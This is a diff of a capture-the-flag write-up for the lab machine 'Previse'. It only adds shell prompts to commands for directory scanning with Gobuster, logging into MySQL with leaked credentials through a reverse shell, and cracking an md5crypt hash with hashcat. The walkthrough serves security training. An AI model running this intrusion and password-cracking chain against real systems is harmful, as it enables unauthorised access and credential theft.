@@ -32,7 +32,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Visiting the box in a web browser brings the visitor to `http://10.10.11.104/login.php`. Running a Gobuster scan with a *php* extension gives the following results.
 ```
-gobuster dir -x php --url 10.10.11.104 --wordlist /usr/share/wordlists/directories.txt -o previse_php.gobuster
+$ gobuster dir -x php --url 10.10.11.104 --wordlist /usr/share/wordlists/directories.txt -o previse_php.gobuster
+
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -135,7 +136,7 @@ function connectDB(){
 
 Use the reverse shell access and MySQL credentials to view the MySQL database.
 ```
-mysql -u root -p
+$ mysql -u root -p
 Enter password: mySQL_p@ssw0rd!:)
 
 mysql> SHOW DATABASES;
@@ -169,8 +170,8 @@ mysql> SELECT * FROM accounts;
 
 Cracking the password for the user `m4lwhere` can be accomplished with `hashcat` using the `rockyou.txt` wordlist.
 ```
-echo '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' > hash.txt
-hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt --force
+$ echo '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' > hash.txt
+$ hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
 Hashcat cracks the hash, with the password `ilovecody112235!`. Back in the reverse shell, log in with the credentials `m4lwhere:ilovecody112235!` and capture **user.txt**.
